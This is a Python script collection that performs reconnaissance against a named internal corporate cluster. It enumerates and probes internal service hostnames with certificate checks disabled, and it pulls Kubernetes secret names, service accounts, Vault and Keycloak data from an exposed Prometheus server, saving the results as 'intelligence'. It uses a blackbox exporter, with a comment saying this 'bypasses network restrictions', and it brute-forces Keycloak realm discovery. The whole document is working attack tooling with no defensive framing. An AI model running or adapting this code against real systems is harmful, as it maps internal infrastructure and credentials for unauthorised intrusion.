import requests, socket
requests.packages.urllib3.disable_warnings()

# Map hostnames to IPs we already know
# (DNS may resolve inside the cluster)
internal_services = {
    "api":         "https://api.studio.sparrow.cloud.echonet.net.intra",
    "front":       "https://front.studio.sparrow.cloud.echonet.net.intra",
    "gatekeeper":  "https://gatekeeper.studio.sparrow.cloud.echonet.net.intra",
    "offer":       "https://offer.studio.sparrow.cloud.echonet.net.intra",
    "project":     "https://project.studio.sparrow.cloud.echonet.net.intra",
    "rbac":        "https://rbac.studio.sparrow.cloud.echonet.net.intra",
    "sparrot":     "https://sparrot.studio.sparrow.cloud.echonet.net.intra",
    "wheelbuilder":"https://wheelbuilder.studio.sparrow.cloud.echonet.net.intra",
    "platform":    "https://platform.sparrow.cloud.net.intra",
}

# First resolve the hostnames
print("=== DNS Resolution ===")
for name, url in internal_services.items():
    hostname = url.split("//")[1]
    try:
        ip = socket.gethostbyname(hostname)
        print(f"  {name:15} {hostname} -> {ip}")
    except Exception as e:
        print(f"  {name:15} {hostname} -> UNRESOLVABLE")

# Then probe each service
print("\n=== Service Probing ===")
endpoints_to_try = [
    "/",
    "/monitoring/live",
    "/health",
    "/healthz", 
    "/api/v1/",
    "/api/v1/me",
    "/api/v1/users",
    "/metrics",
    "/swagger",
    "/openapi.json",
    "/docs",
]

for name, base_url in internal_services.items():
    print(f"\n[{name}] {base_url}")
    for ep in endpoints_to_try:
        try:
            r = requests.get(
                f"{base_url}{ep}",
                verify=False,
                timeout=5,
                allow_redirects=False  # don't follow OAuth2 redirects
            )
            if r.status_code not in [404]:
                print(f"  {r.status_code} {ep}")
                if r.status_code == 200:
                    print(f"    {r.text[:200]}")
                elif r.status_code == 302:
                    print(f"    Redirect -> {r.headers.get('Location','?')}")
        except Exception as e:
            print(f"  ERR {ep}: {type(e).__name__}")
            
            
            
import requests, json
base = "http://198.18.19.18:9090"

# These PromQL queries extract operational intelligence
queries = {
    # All k8s secrets metadata (names, namespaces — not values)
    "k8s_secrets":
        'kube_secret_info',
    
    # All running pods with images — reveals software versions
    "all_pods":
        'kube_pod_info',
    
    # Keycloak metrics — may reveal realm names, client IDs
    "keycloak":
        '{job=~".*keycloak.*"}',
    
    # OAuth2 proxy metrics — reveals protected service URLs
    "oauth2_proxy":
        '{container="oauth2-proxy"}',
    
    # All service accounts
    "service_accounts":
        'kube_pod_spec_serviceaccount_info',
    
    # External secrets — reveals what secrets are synced from vault
    "external_secrets":
        'externalsecret_status_condition',
    
    # Vault metrics if exposed
    "vault_metrics":
        '{__name__=~"vault.*"}',
    
    # Sparrow API request rates — reveals valid endpoints
    "sparrow_api_requests":
        '{job="sparrow-api-prod"}',
    
    # Gatekeeper request metrics
    "gatekeeper_requests":
        '{job="gatekeeper-api-prod"}',

    # Redis metrics — reveals DB size, key count
    "redis":
        '{job=~".*redis.*"}',
}

findings = {}
for name, query in queries.items():
    r = requests.get(f"{base}/api/v1/query",
                    params={"query": query},
                    timeout=15)
    if r.status_code == 200:
        results = r.json()["data"]["result"]
        findings[name] = results
        if results:
            print(f"\n✓ {name}: {len(results)} results")
            # Print unique metric names and key labels
            seen = set()
            for res in results[:5]:
                metric = res.get("metric", {})
                key = f"{metric.get('__name__','')} | {metric.get('container','')} | {metric.get('namespace','')}"
                if key not in seen:
                    seen.add(key)
                    print(f"  {json.dumps(metric)[:180]}")

# Save all findings
with open("prometheus_intel.json", "w") as f:
    json.dump(findings, f, indent=2)
print("\nSaved to prometheus_intel.json")



# Blackbox exporter probes URLs on your behalf
# This bypasses network restrictions!
blackbox = "http://blackbox-exporter-sparrow.sparrow-tooling.svc.cluster.local:9115"

# First resolve the hostname
import socket
try:
    ip = socket.gethostbyname(
        "blackbox-exporter-sparrow.sparrow-tooling.svc.cluster.local"
    )
    print(f"Blackbox exporter IP: {ip}")
    blackbox_ip = f"http://{ip}:9115"
except:
    print("Cannot resolve blackbox hostname")
    blackbox_ip = None

if blackbox_ip:
    # Use blackbox to probe internal services
    # It will tell you if they return 2xx
    for target in [
        "https://api.studio.sparrow.cloud.echonet.net.intra/monitoring/live",
        "https://rbac.studio.sparrow.cloud.echonet.net.intra/monitoring/live",
        "https://gatekeeper.studio.sparrow.cloud.echonet.net.intra/monitoring/live",
    ]:
        r = requests.get(
            f"{blackbox_ip}/probe",
            params={"module": "http_2xx", "target": target},
            timeout=10
        )
        print(f"\nProbe {target.split('//')[1].split('/')[0]}:")
        print(f"  Status: {r.status_code}")
        # Parse probe result
        for line in r.text.splitlines():
            if 'probe_success' in line or 'probe_http_status_code' in line:
                if not line.startswith('#'):
                    print(f"  {line}")
                    
                    
# Keycloak has a well-known discovery endpoint
# Find Keycloak from the OAuth2 redirect URL
# The login page showed: "Sign in with Keycloak OIDC"

# Common Keycloak locations in this cluster
keycloak_candidates = [
    "https://keycloak.studio.sparrow.cloud.echonet.net.intra",
    "https://auth.studio.sparrow.cloud.echonet.net.intra",
    "https://sso.studio.sparrow.cloud.echonet.net.intra",
    "https://iam.studio.sparrow.cloud.echonet.net.intra",
]

for url in keycloak_candidates:
    try:
        hostname = url.split("//")[1]
        ip = socket.gethostbyname(hostname)
        print(f"RESOLVED: {hostname} -> {ip}")
        
        # Keycloak well-known endpoint reveals realm config
        for realm in ["master", "sparrow", "datalab", 
                      "sparrow-studio", "prod"]:
            r = requests.get(
                f"{url}/realms/{realm}/.well-known/openid-configuration",
                verify=False, timeout=5
            )
            if r.status_code == 200:
                data = r.json()
                print(f"  REALM FOUND: {realm}")
                print(f"  token_endpoint: {data.get('token_endpoint')}")
                print(f"  userinfo: {data.get('userinfo_endpoint')}")
    except socket.gaierror:
        pass
    except Exception as e:
        print(f"{url}: {type(e).__name__}: {e}")
